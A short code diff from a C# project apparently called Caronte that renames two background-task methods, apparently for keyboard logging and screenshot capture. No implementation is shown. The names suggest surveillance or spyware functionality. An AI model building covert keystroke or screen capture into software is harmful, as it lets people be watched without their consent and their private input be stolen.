@@ -9,7 +9,7 @@ namespace Caronte.Modules.Information
 {
     public static class StartInformationServices
     {
-        public static Task InitializeKeyboardLogTask(CancellationToken _cancellationToken, IMediator _mediator)
+        public static Task KeyboardLog(CancellationToken _cancellationToken, IMediator _mediator)
         {
             var logTask = Task.Run(async () =>
             {
@@ -20,7 +20,7 @@ namespace Caronte.Modules.Information
             return logTask;
         }
 
-        public static Task InitializePrintScreenTask(CancellationToken _cancellationToken, IMediator _mediator)
+        public static Task PrintScreen(CancellationToken _cancellationToken, IMediator _mediator)
         {
             var printScreenTask = Task.Run(async () =>
             {
